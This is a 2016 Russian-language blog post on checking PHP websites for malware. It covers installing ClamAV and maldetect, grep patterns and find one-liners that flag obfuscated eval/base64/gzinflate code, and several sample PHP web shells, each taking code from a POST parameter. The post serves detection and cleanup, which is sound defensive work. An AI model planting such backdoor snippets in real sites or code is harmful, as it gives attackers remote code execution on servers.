---
title: "PHP: antivirus website check"
date: 2016-07-21T03:02:01+00:00
url: /2016/07/php-antivirus-website-check/
categories:
  - Linux
  - virtualmin

---
**Автоматизированное сканирование:**  
Базовая установка:  
[bash]  
yum install clamav -y  
cd /root/install  
rm -rf maldetect-*  
wget http://www.rfxn.com/downloads/maldetect-current.tar.gz  
tar xfz maldetect-current.tar.gz  
cd maldetect-*  
./install.sh  
cd ~ && rm -rf /root/install/maldetect-* && rm -rf /etc/cron.daily/maldet  
echo &#8220;.avi  
.jpg  
.flv  
.png &#8221; > /usr/local/maldetect/ignore\_file\_ext  
[/bash]  
Сканирование:  
[bash]  
freshclam ; maldet -u ; maldet -d ;  
maldet &#8211;scan-all /home/  
[/bash]

**Ручная проверка** на предмет подозрительных файлов:  
Подозриельность определяеся наличием следующих комбинаций, которые находятся в одной строке файла:  
[code]  
eval.*str_rot13  
eval.*base64_decode  
eval.*gzinflate  
file\_put\_contents.*base64_decode  
base64_encode.*eval  
eval.\*(.\*GLOBAL.*(  
isset.\*(.\*eval.*(  
[/code]  
Однострочники такие:  
[bash]  
#  
find /var/www/\*/data/www/\*/wp-content/uploads/ /home/\*/domains/\*/\*/wp-content/uploads/ /home/\*/\*/wp-content/uploads/ -iname &#8220;\*.php&#8221;  
find /home/ -type f -iname &#8220;\*.php&#8221; -exec egrep -l &#8216;eval.\*str\_rot13|eval.\*base64\_decode|eval.\*gzinflate|file\_put\_contents.\*base64\_decode|base64\_encode.\*eval|eval.\*\(.\*GLOBAL.\*\(|isset.\*\(.\*eval.\*\(|\w{525,}&#8217; {} \;  
#  
[/bash]

На что еще можно обратить внимание:  
[code]  
@system(&#8220;killall  
file\_put\_contents(&#8216;1.txt  
assert(  
FuncQueueObject  
\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65 # == base64_decode  
\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65 # == gzinflate  
[/code]

Интересные примеры:  
[code]  
<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['pass']);?>

  
<?php ($b4dboy = $_POST['gnm']) &#038;&#038; @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); ?>

  
<?php function OLsy($yzcW){
$code='bas'.'e64_d'.'eco'.'de';
$yzcW=gzinflate($code($yzcW));
 for($i=0;$i<strlen($yzcW);$i++)
 {
$yzcW[$i] = chr(ord($yzcW[$i])-1);
 }
 return $yzcW;
 }eval(OLsy("
...
[/code]


</p>